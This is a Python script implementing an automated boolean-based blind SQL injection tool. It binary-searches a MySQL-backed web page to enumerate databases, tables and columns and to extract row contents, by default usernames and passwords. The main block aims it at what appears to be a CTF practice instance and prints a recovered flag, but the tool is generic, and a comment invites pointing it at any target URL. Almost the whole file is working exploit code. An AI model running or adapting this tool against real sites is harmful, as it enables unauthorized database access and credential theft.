import requests
import time


class BoolAttackHelper:
    def __init__(
            self,
            url: str,
            judge_flag: str) -> None:
        self.url = url
        self.judge_flag = judge_flag
        self.ascii_dict = BoolAttackHelper._ascii_str()

    # 生成库名表名字符所在的字符列表字典
    def _ascii_str():
        str_list = []
        # 基本ascii码中的可显字符
        for i in range(33, 127):
            str_list.append(chr(i))
       # 返回字符列表
        return str_list

    # 检查返回的http状态
    def status_check(
            self,
            status_code: int):
        if status_code == 429:
            # 可优化为指数的sleep休息时间
            print("too many requests ,sleep 1 second")
            time.sleep(1)
        elif status_code == 404:
            # 无法访问远程服务器，程序立刻退出
            print("can not connect remote web server , please check internet connection")
            exit(1)

    # 使用二分查找有多少个数据库
    def get_databases_counts(
            self,
            attack_suffix:str=f"?id=1' and (SELECT count(*) FROM information_schema.schemata) <= {{}} --+",
            ):
        left, right = 1, 64
        while left < right:
            mid = (left+right)//2
            r = requests.get(self.url+attack_suffix.format(mid))
            self.status_check(r.status_code)
            if self.judge_flag in r.text:
                right = mid
            else:
                left = mid+1
        return right

    # 使用二分查找计算每个数据库的长度
    def get_databases_length(
            self,
            database_count:int,
            attack_suffix: str = f"?id=1' and Length((SELECT schema_name FROM information_schema.schemata limit {{}},1)) <= {{}}  --+"):
        databases_length = []
        for i in range(database_count):
            # right为64是因为数据库的名称长度为64
            left, right = 1, 64
            while left < right:
                mid = (left+right)//2
                r = requests.get(self.url+attack_suffix.format(i,mid))
                self.status_check(r.status_code)
                if self.judge_flag in r.text:
                    right = mid
                else:
                    left = mid+1
            databases_length.append(right)
        return databases_length

    # 使用二分查找计算每个数据库的名字
    def get_databases_name(
            self,
            databases_length: list[int],
            attack_suffix: str = f"?id=1' and mid((SELECT schema_name FROM information_schema.schemata limit {{}},1),{{}},1)<='{{}}' --+"):
        databases_name = []
        for i in range(len(databases_length)):
            database_name = ""
            # 经过实际测试第一个字符是一个<='!'的字符，并不是数据库名，猜测是空字符，所以这里从下标1开始计算
            for j in range(1, databases_length[i]+1):
                left, right = 0, len(self.ascii_dict)-1
                while left < right:
                    mid = (left+right)//2
                    r = requests.get(
                        self.url+attack_suffix.format(i, j,self.ascii_dict[mid]))
                    self.status_check(r.status_code)
                    if self.judge_flag in r.text:
                        right = mid
                    else:
                        left = mid+1
                database_name = database_name+self.ascii_dict[right]
            databases_name.append(database_name.lower())
        return databases_name

    # 使用二分法计算出表的数目
    def get_tables_count(
            self,
            database_name: str,
            upper_limit: int = 1000,
            attack_suffix: str = f"?id=1' and (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='{{}}') <= {{}} --+"):
        left, right = 0, upper_limit
        while left < right:
            mid = (left+right)//2
            r = requests.get(self.url+attack_suffix.format(database_name, mid))
            self.status_check(r.status_code)
            if self.judge_flag in r.text:
                right = mid
            else:
                left = mid+1
        database_name = database_name+self.ascii_dict[right]
        return right

    # 使用二分法计算出每个表的表名长度
    def get_tables_length(
            self,
            databese_name: str,
            table_count: int,
            attack_suffix: str = f"?id=1' and (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='{{}}' limit {{}},1) <= {{}} --+"):
        tables_length = []
        for i in range(table_count):
            # 表名最长是64
            left, right = 0, 64
            while left < right:
                mid = (left+right)//2
                r = requests.get(
                    self.url+attack_suffix.format(databese_name, i, mid))
                self.status_check(r.status_code)
                if self.judge_flag in r.text:
                    right = mid
                else:
                    left = mid+1
            tables_length.append(right)
        return tables_length

    # 计算每一个表的的名字
    def get_tables_name(
            self,
            database_name: str,
            tables_length: list[int],
            attack_suffix: str = f"?id=1' and mid((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = '{{}}' limit {{}},1 ),{{}},1) <= '{{}}' --+"):
        tables_name = []
        for i in range(len(tables_length)):
            table_name: str = ""
            for j in range(1, tables_length[i]+1):
                left, right = 0, len(self.ascii_dict)-1
                while left < right:
                    mid = (left+right)//2
                    r = requests.get(
                        self.url+attack_suffix.format(database_name, i, j, self.ascii_dict[mid]))
                    self.status_check(r.status_code)
                    if self.judge_flag in r.text:
                        right = mid
                    else:
                        left = mid+1
                table_name = table_name+self.ascii_dict[right]
            tables_name.append(table_name.lower())
        return tables_name

    # 获取一个表的字段数
    def get_columns_count(
            self,
            database_name: str,
            table_name: str,
            attack_suffix: str = f"?id=1' and (select count(column_name) from information_schema.COLUMNS where TABLE_SCHEMA='{{}}' and TABLE_NAME ='{{}}') <= {{}} --+") -> int:
        left, right = 0, 4096
        while left < right:
            mid = (left+right)//2
            r = requests.get(
                self.url+attack_suffix.format(database_name, table_name, mid))
            self.status_check(r.status_code)
            if self.judge_flag in r.text:
                right = mid
            else:
                left = mid+1
        return right

    # 获取给定表的每一个字段的长度
    def get_columns_length(
            self,
            database_name: str,
            table_name: str,
            columns_count: int,
            attack_suffix: str = f"?id=1' and (select length(column_name) from information_schema.COLUMNS where TABLE_SCHEMA='{{}}' and TABLE_NAME ='{{}}' limit {{}},1) <= {{}}--+"):
        columns_length = []
        for i in range(columns_count):
            left, right = 0, 64
            while left < right:
                mid = (left+right)//2
                r = requests.get(
                    self.url+attack_suffix.format(database_name, table_name, i, mid))
                self.status_check(r.status_code)
                if self.judge_flag in r.text:
                    right = mid
                else:
                    left = mid+1
            columns_length.append(right)
        return columns_length

    # 获取给定表的每一个字段的名称
    def get_columns_name(
            self,
            database_name: str,
            table_name: str,
            columns_length: list[int],
            attack_suffix: str = f"?id=1' and mid((select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA='{{}}' and TABLE_NAME ='{{}}' limit {{}},1),{{}},1) <= '{{}}' --+"):
        columns_name = []
        for i in range(len(columns_length)):
            column_name = ""
            for j in range(1, columns_length[i]+1):
                left, right = 0, len(self.ascii_dict)-1
                while left < right:
                    mid = (left+right)//2
                    r = requests.get(
                        self.url+attack_suffix.format(database_name, table_name, i, j, self.ascii_dict[mid]))
                    self.status_check(r.status_code)
                    if self.judge_flag in r.text:
                        right = mid
                    else:
                        left = mid+1
                column_name = column_name+self.ascii_dict[right]
            columns_name.append(column_name.lower())
        return columns_name

    # 获取给定表的给定字段下的内容数量
    def get_rows_count(
            self,
            database_name: str,
            table_name: str,
            attack_suffix: str = f"?id=1' and (select count(*) from {{}}.{{}}) <= {{}} --+"
    ):
        left, right = 0, 5000000
        while left < right:
            mid = (left+right)//2
            r = requests.get(
                self.url+attack_suffix.format(database_name, table_name, mid))
            self.status_check(r.status_code)
            if self.judge_flag in r.text:
                right = mid
            else:
                left = mid+1
        return right

    # 从表中获取所有行的长度
    def get_rows_length(
            self,
            database_name: str,
            table_name: str,
            rows_count:int,
            wanted_content:str="concat(username,0x7e,password)",
            attack_suffix: str = f"?id=1' and (select length({{}}) from {{}}.{{}} limit {{}},1) <= {{}} --+"):
        rows_length = []
        for i in range(rows_count):
            left, right = 0, 64
            while left < right:
                mid = (left+right)//2
                r = requests.get(
                    self.url+attack_suffix.format(wanted_content,database_name, table_name, i, mid))
                self.status_check(r.status_code)
                if self.judge_flag in r.text:
                    right = mid
                else:
                    left = mid+1
            rows_length.append(right)
        return rows_length

    # 从表中获取所有行的内容
    def get_rows_content(
            self,
            database_name: str,
            table_name: str,
            rows_length:list[int],
            wanted_content:str="concat(username,0x7e,password)",
            attack_suffix: str = f"?id=1' and mid((select {{}} from {{}}.{{}} limit {{}},1),{{}},1) <= '{{}}' --+"):
        rows_content = []
        for i in range(len(rows_length)):
            row_content = ""
            for j in range(1,rows_length[i]+1):
                left, right = 0, len(self.ascii_dict)-1
                while left < right:
                    mid = (left+right)//2
                    r = requests.get(
                        self.url+attack_suffix.format(wanted_content,database_name, table_name, i, j, self.ascii_dict[mid]))
                    self.status_check(r.status_code)
                    if self.judge_flag in r.text:
                        right = mid
                    else:
                        left = mid+1
                row_content = row_content+self.ascii_dict[right]
            rows_content.append(row_content.lower())
        return rows_content

if __name__ == "__main__":
    # 这个url请切换为你需要攻击的网址的url
    url = "http://abcdefghijklmnopqrstuvwxyz.node4.buuoj.cn/Less-5/"
    judge_flag = 'You are in'
    bool_attack_helper = BoolAttackHelper(url, judge_flag)
    # databases_count = bool_attack_helper.get_databases_counts() # databases_count = 6
    databases_count = 6
    # databases_length = bool_attack_helper.get_databases_length(databases_count) # database_length = [11, 18, 5, 18, 8, 4]
    databases_length = [11, 18, 5, 18, 8, 4]
    # databases_name = bool_attack_helper.get_databases_name(databases_length) # database_name="security"
    databases_name = ['ctftraining', 'information_schema', 'mysql', 'performance_schema', 'security', 'test']
    print(databases_name)
    # tables_count = bool_attack_helper.get_tables_count(databases_name[0]) 
    tables_count = 3
    print(tables_count)
    # tables_length = bool_attack_helper.get_tables_length(databases_name[0],tables_count) # tables_length = [6, 8, 7, 5]
    tables_length = [4, 4, 5]
    print(tables_length)
    # tables_name = bool_attack_helper.get_tables_name(databases_name[0], tables_length)  # tables_name=['emails', 'referers', 'uagents', 'users']
    tables_name = ['flag', 'news', 'users']
    print(tables_name)
    # columns_count = bool_attack_helper.get_columns_count(databases_name[0],table_name=tables_name[0]) #columns_count=3
    columns_count = 1
    print(columns_count)
    # columns_length = bool_attack_helper.get_columns_length(databases_name[0],tables_name[0],columns_count) # columns_length=[2, 8, 8]
    columns_length = [4]
    print(columns_length)
    # columns_name = bool_attack_helper.get_columns_name(databases_name[0],tables_name[0],columns_length) # columns_name = ['id', 'username', 'password']
    columns_name = ['flag']
    print(columns_name)
    # rows_count = bool_attack_helper.get_rows_count(databases_name[0], tables_name[0]) # rows_count = 8
    rows_count = 1
    print(rows_count)
    # rows_length = bool_attack_helper.get_rows_length(databases_name[0],tables_name[0],rows_count = 1,wanted_content=columns_name[0]) # rows_length = [9, 19, 14, 13, 16, 16, 13, 11]
    rows_length = [42]
    print(rows_length)
    # rows_content =  bool_attack_helper.get_rows_content(databases_name[0],tables_name[0],rows_length,wanted_content=columns_name[0])
    rows_content = ['flag{8bd44270-8f98-476a-a51e-31a6b28de300}']
    print(rows_content)